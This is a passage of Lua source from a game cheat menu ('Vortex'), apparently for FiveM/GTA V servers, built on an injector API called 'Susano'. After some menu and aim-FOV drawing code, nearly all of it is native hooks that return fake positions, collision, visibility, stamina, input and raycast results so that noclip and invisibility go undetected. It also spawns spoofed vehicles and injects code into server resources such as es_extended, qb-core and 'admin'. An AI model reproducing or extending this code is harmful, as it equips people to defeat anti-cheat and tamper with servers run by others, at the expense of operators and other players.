    Susano.DrawRectFilled(footerX, footerY, footerWidth, mainFooterHeight,
        0.0, 0.0, 0.0, 1.0,
        0.0)

    Susano.DrawRectFilled(footerX, footerY + mainFooterHeight, footerWidth, VortexStyle.footerRounding,
        0.0, 0.0, 0.0, 1.0,
        VortexStyle.footerRounding)

    local footerStartY = footerY

    local footerPadding = 15
    local footerTextY = footerStartY + (VortexStyle.footerHeight / 2) - (VortexStyle.footerSize / 2) + 1
    local currentX = x + footerPadding

    local betaText = "BETA"
    Susano.DrawText(currentX, footerTextY,
        betaText, VortexStyle.footerSize,
        1.0, 1.0, 1.0, 1.0)
    currentX = currentX + Susano.GetTextWidth(betaText, VortexStyle.footerSize) + 8

    Susano.DrawText(currentX, footerTextY,
        "|", VortexStyle.footerSize,
        1.0, 1.0, 1.0, 1.0)
    currentX = currentX + Susano.GetTextWidth("|", VortexStyle.footerSize) + 8

    local novynText = "Novyn"
    Susano.DrawText(currentX, footerTextY,
        novynText, VortexStyle.footerSize,
        1.0, 1.0, 1.0, 1.0)

    local posText = string.format("%d/%d", VortexMenu.selectedIndex, #currentItems)
    local posWidth = Susano.GetTextWidth(posText, VortexStyle.footerSize)

    Susano.DrawText(x + width - posWidth - footerPadding, footerTextY,
        posText, VortexStyle.footerSize,
        1.0, 1.0, 1.0, 1.0)

    if vortex_miscTargetInterfaceOpen then
        DrawMiscTargetInterface()
    end

    if vortex_drawFovEnabled then
        local centerX = 1920 / 2
        local centerY = 1080 / 2

        local circumference = 2 * math.pi * vortex_fovRadius
        local numPoints = math.max(250, math.floor(circumference / 1.5))

        local rectSize = 1.5

        for i = 0, numPoints - 1 do
            local angle = (i / numPoints) * 2 * math.pi
            local x = centerX + math.cos(angle) * vortex_fovRadius
            local y = centerY + math.sin(angle) * vortex_fovRadius

            Susano.DrawRectFilled(x - rectSize/2, y - rectSize/2, rectSize, rectSize,
                1.0, 0.0, 0.0, 1.0,
                rectSize / 2)
        end
    end

    if vortex_showMenuKeybindsEnabled then
        DrawKeybindsInterface()
    end

    Vortex_DrawNotifications()

    Susano.SubmitFrame()

    end) -- end pcall wrapping DrawMenu body
    if not drawOk then
        print("^1[Vortex] DrawMenu error: " .. tostring(drawErr) .. "^7")
    end
end

if Susano and Susano.HookNative then
    Susano.HookNative(0xAF35D0D2583051B0, function(modelHash, x, y, z, heading, isNetwork, bScriptHostVeh)
        local hash = modelHash
        if type(modelHash) == "string" then
            hash = GetHashKey(modelHash)
        end

        RequestModel(hash)
        local timeout = 0
        while not HasModelLoaded(hash) and timeout < 100 do
            Wait(5)
            timeout = timeout + 1
        end

        if HasModelLoaded(hash) then
            Wait(300)
            if not Susano or not Susano.CreateSpoofedVehicle then
                SetModelAsNoLongerNeeded(hash)
                return true, 0
            end
            local ok, veh = pcall(Susano.CreateSpoofedVehicle, hash, x, y, z, heading, false, false, false)
            SetModelAsNoLongerNeeded(hash)
            if ok and veh and veh ~= 0 then
                SetEntityAsMissionEntity(veh, true, true)
                SetVehicleHasBeenOwnedByPlayer(veh, true)
                SetVehicleNeedsToBeHotwired(veh, false)
                SetVehicleEngineOn(veh, true, true, false)
                return false, veh
            end
        end

        return true
    end)

    Susano.HookNative(0x35FB78DC42B7BD21, function(modelHash)
        return false, true
    end)

    Susano.HookNative(0x392C8D8E07B70EFC, function(modelHash)
        return false, true
    end)

    Susano.HookNative(0x98A4EB5D89A0C952, function(modelHash)
        return false, true
    end)

    Susano.HookNative(0x963D27A58DF860AC, function(modelHash)
        return false
    end)

    Susano.HookNative(0xEA386986E786A54F, function(vehicle)
        return false
    end)

    Susano.HookNative(0xAE3CBE5BF394C9C9, function(entity)
        local entityType = GetEntityType(entity)
        if entityType == 2 then
            return false
        end
        return true
    end)

    Susano.HookNative(0x7D9EFB7AD6B19754, function(vehicle, toggle)
        return false
    end)

    Susano.HookNative(0x1CF38D529D7441D9, function(vehicle, toggle)
        return false
    end)

    Susano.HookNative(0x99AD4CCCB128CBC9, function(vehicle)
        return false
    end)

    Susano.HookNative(0xE5810AC70602F2F5, function(vehicle, speed)
        return false
    end)

    Citizen.CreateThread(function()
        Wait(2000)

        local resources = {
            "es_extended",
            "esx_vehicleshop",
            "qb-core",
            "qb-vehicleshop",
            "lbphone",
            "garage",
            "admin",
            "gamemode",
            "any"
        }

        for _, res in ipairs(resources) do
            if GetResourceState(res) == "started" or res == "any" then
                Vortex_InjectIntoResource(res)
                Wait(20)
            end
        end
    end)

    Susano.HookNative(0x0E46A3FCBDE2A1B1, function(entity, speed)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false
        end
        return true
    end)

    Susano.HookNative(0x9FF36FB7A1264F8F, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, 0.0, 0.0, 0.0
        end
        return true
    end)

    Susano.HookNative(0x1718DE8E3F2823CA, function(entity, toggle)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false
        end
        return true
    end)

    Susano.HookNative(0x0991549DE4D64762, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, true
        end
        return true
    end)

    Susano.HookNative(0x7A1BDAD0A2E83BE5, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, PlayerId()
        end
        return true
    end)

    Susano.HookNative(0xE05E81A888FA63C8, function(netId, toggle)
        if vortex_noclipEnabled then
            return false
        end
        return true
    end)

    Susano.HookNative(0x299EEB23175895FC, function(netId, toggle)
        if vortex_noclipEnabled then
            return false
        end
        return true
    end)

    Susano.HookNative(0xB8DFD30D6973E135, function(player)
        return false, true
    end)

    Susano.HookNative(0x8DB296B814EDDA07, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x048746E388762E11, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x17C07FC640E86B4E, function(ped, boneId, offsetX, offsetY, offsetZ)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            local coords = GetEntityCoords(ped)
            return false, coords.x, coords.y, coords.z
        end
        return true
    end)

    Susano.HookNative(0xD75960F6BD9EA49C, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false, 0
        end
        return true
    end)

    Susano.HookNative(0x48C2BED9180FE123, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, 0
        end
        return true
    end)

    Susano.HookNative(0xB128377056A54E2A, function(ped, toggle)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false
        end
        return true
    end)

    Susano.HookNative(0x47E4E977581C5B55, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x79CFD9827CC979B6, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, -1
        end
        return true
    end)

    Susano.HookNative(0x7DCE8BDA0F1C1200, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xFB92A102F1C4DFA3, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x53E8CB4F48BFE623, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x117C6D7A7E1ADEA4, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x5527B8246FEF9B11, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x7C2AC9CA66575FBF, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xC86D67D52A707CF8, function(entity1, entity2, p2)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity1 == ped or entity1 == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x33DBB3E5C8D0DE67, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x605F5A140CC7DABE, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xE8D7C11FEA02BB97, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x4F6B7ED55C9EB89F, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false
        end
        return true
    end)

    Susano.HookNative(0x8BDC7BFC57A81E76, function(x, y, z)
        if vortex_noclipEnabled then
            local offset = 0.8 + math.random() * 0.7
            return false, true, z - offset, 0.0, 0.0, 1.0
        end
        return true
    end)

    Susano.HookNative(0xE54E2827CEA4A74D, function(x, y, z, sizeX, sizeY, sizeZ, p6)
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xC3C00C8A0E4F7E37, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, 0
        end
        return true
    end)

    Susano.HookNative(0xB0760331C7AA4155, function(ped, taskIndex)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xD76B57B44F1E6F8B, function(ped, x, y, z, speed, timeout, targetHeading, distanceToSlide)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false
        end
        return true
    end)

    Susano.HookNative(0x14D6F5678D8F1B37, function()
        if vortex_noclipEnabled then
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local rad = math.rad(heading)
            local camOffset = vector3(
                coords.x - math.sin(rad) * 1.5,
                coords.y + math.cos(rad) * 1.5,
                coords.z + 0.6
            )
            return false, camOffset.x, camOffset.y, camOffset.z
        end
        return true
    end)

    Susano.HookNative(0x5B4E4C817FCC2DFB, function()
        if vortex_noclipEnabled then
            local coords = GetEntityCoords(PlayerPedId())
            return false, coords.x, coords.y, coords.z
        end
        return true
    end)

    Susano.HookNative(0xC45D23BAF168AAB8, function(vehicle)
        local ped = PlayerPedId()
        if vortex_noclipEnabled and IsPedInVehicle(ped, vehicle, false) then
            return false, 1000.0
        end
        return true
    end)

    Susano.HookNative(0xF271147EB7B40F12, function(vehicle)
        local ped = PlayerPedId()
        if vortex_noclipEnabled and IsPedInVehicle(ped, vehicle, false) then
            return false, 1000.0
        end
        return true
    end)

    Susano.HookNative(0xBCDC5017D3CE1E9E, function(vehicle)
        local ped = PlayerPedId()
        if vortex_noclipEnabled and IsPedInVehicle(ped, vehicle, false) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x377906D8A31E5586, function(x1, y1, z1, x2, y2, z2, flags, entity, p8)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and entity == playerEntity then
            return false, 0
        end
        return true
    end)

    Susano.HookNative(0x3D87450E15D98694, function(shapeTestHandle)
        if vortex_noclipEnabled then
            return false, 2, false, vector3(0,0,0), vector3(0,0,0), 0, 0
        end
        return true
    end)

    Susano.HookNative(0xFCDFF7B72D23A1AC, function(entity1, entity2, traceType)
        local ped = PlayerPedId()
        if vortex_noclipEnabled and (entity1 == ped or entity2 == ped) then
            return false, true
        end
        return true
    end)

    Susano.HookNative(0xB721981B2B939E07, function(player)
        if vortex_noclipEnabled and player == PlayerId() then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x13EDE1A5DBF97673, function(player)
        if vortex_noclipEnabled and player == PlayerId() then
            return false, false, 0
        end
        return true
    end)

    Susano.HookNative(0x2E397FD2ECD37C87, function(player)
        if vortex_noclipEnabled and player == PlayerId() then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x7912F7FC4F6264B6, function(player, entity)
        if vortex_noclipEnabled and player == PlayerId() then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xE28E54788CE8F12D, function(player)
        if vortex_noclipEnabled and player == PlayerId() then
            return false, 0
        end
        return true
    end)

    Susano.HookNative(0x15C40837039FFAF7, function()
        if vortex_noclipEnabled then
            return false, 0.016
        end
        return true
    end)

    Susano.HookNative(0x5F9532F3B5CC2551, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x28D3FED7190D3A0B, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xCFD79241DB350F07, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xE659E47AF827484B, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, true
        end
        return true
    end)

    Susano.HookNative(0x9A2304A64C3C8423, function(entity, targetEntity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x2AE5BC7EA89E1767, function(entity, modelHash)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xD05BFF0C0A12C68F, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x2D343D2219CD027A, function(ped, weaponHash, weaponType)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x6C4D0409BA1A2BC2, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false, vector3(0, 0, 0)
        end
        return true
    end)

    Susano.HookNative(0x34616828CD07F1A1, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x4D9E68C8CF6F7C09, function(ped, p1)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x7EE64D51E8498728, function(x, y, z)
        if vortex_noclipEnabled then
            return false, "SANAND"
        end
        return true
    end)

    Susano.HookNative(0xB61C8E878A4199CA, function(x, y, z, onGround, flags)
        if vortex_noclipEnabled then
            return false, true, x, y, z
        end
        return true
    end)

    Susano.HookNative(0x132F52BBA570FE92, function(x, y, z, p3, p4)
        if vortex_noclipEnabled then
            return false, true, vector3(x, y, z), vector3(x, y, z), 0, 0.0, 0
        end
        return true
    end)

    Susano.HookNative(0xE65F427EB70AB1ED, function(soundId, audioName, entity, audioRef, p4, p5)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false
        end
        return true
    end)

    Susano.HookNative(0x8D8686B622B88120, function(soundId, audioName, x, y, z, audioRef, p6, range, p8)
        if vortex_noclipEnabled then
            local myPos = GetEntityCoords(PlayerPedId())
            if #(vector3(x, y, z) - myPos) < 10.0 then
                return false
            end
        end
        return true
    end)

    Susano.HookNative(0xFA7C7F0AADF25D09, function(blip)
        if vortex_noclipEnabled then
            return false, vector3(0, 0, 0)
        end
        return true
    end)

    Susano.HookNative(0x1BEDE233E6CD2A1F, function(blipSprite)
        if vortex_noclipEnabled then
            return false, 0
        end
        return true
    end)

    Susano.HookNative(0x2AFE52F782F25775, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            local currentTime = GetGameTimer()
            if currentTime - lastHeightUpdate > 500 then
                local baseHeight = IsPedInAnyVehicle(ped, false) and 1.2 or 1.0
                heightVariation = baseHeight + (math.sin(currentTime / 1000.0) * 0.3)
                lastHeightUpdate = currentTime
            end
            return false, math.max(0.5, heightVariation)
        end
        return true
    end)

    Susano.HookNative(0x56911B50F41ECC48, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, 0
        end
        return true
    end)

    Susano.HookNative(0x57E457CD2C0FC168, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            local currentTime = GetGameTimer()
            if currentTime - lastMovementUpdate > 1000 then
                sprintingState = math.random() > 0.7
                lastMovementUpdate = currentTime
            end
            return false, sprintingState
        end
        return true
    end)

    Susano.HookNative(0xDE4C184B2B9B071A, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            local currentTime = GetGameTimer()
            if currentTime - lastMovementUpdate > 1000 then
                walkingState = not sprintingState and math.random() > 0.5
                lastMovementUpdate = currentTime
            end
            return false, walkingState
        end
        return true
    end)

    Susano.HookNative(0x1B10C5BC6D6A5A4E, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, not IsPedInAnyVehicle(myPed, false)
        end
        return true
    end)

    Susano.HookNative(0xE0A89432D942570, function(player)
        if vortex_noclipEnabled and player == PlayerId() then
            if sprintingState and fakeStamina > 20.0 then
                fakeStamina = fakeStamina - 0.5
            elseif fakeStamina < 100.0 then
                fakeStamina = fakeStamina + 0.3
            end
            return false, fakeStamina
        end
        return true
    end)

    Susano.HookNative(0x9DE327631295B4C2, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xC024869A53992F34, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x6EC6B5E74B7FC7B0, function()
        if vortex_noclipEnabled then
            return false, true
        end
        return true
    end)

    Susano.HookNative(0x3317DCCB6C08F01C, function(ped, p1)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x67722AEB798E5FAB, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xE3B6097CC25AA69E, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x433DDFFE2044B95B, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xD128A6B4C5E3F1F, function(ped)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xE465D4AB7CA6AE72, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, vector3(0.0, 0.0, 1.0)
        end
        return true
    end)

    Susano.HookNative(0xCC0787A5F12D2F0C, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x5B84C9585F4061A, function(inputGroup, control)
        if vortex_noclipEnabled then
            if control == 1 or control == 2 then
                return false, (math.random() - 0.5) * 0.3
            elseif control == 10 or control == 11 then
                return false, (math.random() - 0.5) * 0.4
            elseif control == 121 then
                return false, 0.0
            end
        end
        return true
    end)

    Susano.HookNative(0xEC3C9B8D5327B563, function(inputGroup, control)
        if vortex_noclipEnabled then
            if control == 1 or control == 2 then
                return false, (math.random() - 0.5) * 0.3
            elseif control == 10 or control == 11 then
                return false, (math.random() - 0.5) * 0.4
            elseif control == 121 then
                return false, 0.0
            end
        end
        return true
    end)

    Susano.HookNative(0x4D1F2C52D4EDBC3, function(inputGroup)
        if vortex_noclipEnabled then
            return false, math.random(100, 500)
        end
        return true
    end)

    Susano.HookNative(0x68EDDA28A5976D07, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x5234F9F10919EABA, function()
        if vortex_noclipEnabled then
            return false, -1
        end
        return true
    end)

    Susano.HookNative(0x602685881F7C3D4B, function(rotationOrder)
        if vortex_noclipEnabled then
            local camRot = GetGameplayCamRot(rotationOrder)
            return false, camRot.x, camRot.y, camRot.z
        end
        return true
    end)

    Susano.HookNative(0x8D4D46230B2C353A, function()
        if vortex_noclipEnabled then
            return false, 4
        end
        return true
    end)

    Susano.HookNative(0xC6D3D26810C8E0F9, function()
        if vortex_noclipEnabled then
            return false, true
        end
        return true
    end)

    Susano.HookNative(0xE31C0CB1C3186D42, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x65019750BE5E9B5, function()
        if vortex_noclipEnabled then
            return false, 50.0
        end
        return true
    end)

    Susano.HookNative(0xB346476EF1A64897, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xC7DC5A0A7DF608CB, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xD00D76A7DFC9D852, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xB15162CB5826E9E8, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x40C11916D16CA2C, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x7E67ABCA0E7043C, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x19CAFA3C87F7C2FF, function()
        if vortex_noclipEnabled then
            return false, 0
        end
        return true
    end)

    Susano.HookNative(0x2CE056FF3DD86382, function(entity, toggle)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false
        end
        return true
    end)

    Susano.HookNative(0x18FF00FC7EFF559E, function()
        if vortex_noclipEnabled then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0xAD15F075A4DA0FDE, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, true
        end
        return true
    end)

    Susano.HookNative(0xBB40DD2270B65366, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x5C3B791D580E0BBC, function(entity, x, y, z)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false
        end
        return true
    end)

    Susano.HookNative(0x407F8D034F70F0C2, function(entity, toggle)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false
        end
        return true
    end)

    Susano.HookNative(0xEEA3AFE5E0A8C47C, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, false
        end
        return true
    end)

    Susano.HookNative(0x659E1B811C0A8BED, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, true
        end
        return true
    end)

    Susano.HookNative(0x188736456D1DEDE6, function(ped, toggle)
        local myPed = PlayerPedId()
        if vortex_noclipEnabled and ped == myPed then
            return false
        end
        return true
    end)

    Susano.HookNative(0x9A8D700A51CB7B0D, function(entity, relative)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped

        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false, 0.0, 0.0, 0.0
        end
        return true
    end)

    Susano.HookNative(0xAFBD61CC738D9EB9, function(entity, rotationOrder)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped

        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            local heading = GetEntityHeading(entity)
            return false, 0.0, 0.0, heading
        end
        return true
    end)

    Susano.HookNative(0xEA1C610A04DB6BBB, function(entity, toggle, unk)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped

        if vortex_noclipInvisibleEnabled and (entity == ped or entity == playerEntity) and not isScreenshotActive then
            return false
        end
        return true
    end)

    Susano.HookNative(0x47D6F43D77935C75, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped

        if vortex_noclipInvisibleEnabled and (entity == ped or entity == playerEntity) and not isScreenshotActive then
            return false, true
        end
        return true
    end)

    Susano.HookNative(0x1C99BB7B6E96D16F, function(entity, x, y, z)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped

        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            return false
        end
        return true
    end)

    Susano.HookNative(0xE83D4F9BA2A38914, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped

        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            local heading = GetEntityHeading(entity)
            return false, heading
        end
        return true
    end)

    Susano.HookNative(0x8E2530AA8ADA980E, function(entity, heading)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped
        return true
    end)

    Susano.HookNative(0x0A794A5A57F8DF91, function(entity)
        local ped = PlayerPedId()
        local playerEntity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped

        if vortex_noclipEnabled and (entity == ped or entity == playerEntity) then
            local heading = GetEntityHeading(entity)
            local rad = math.rad(heading)
            return false, -math.sin(rad), math.cos(rad), 0.0
        end
        return true
    end)

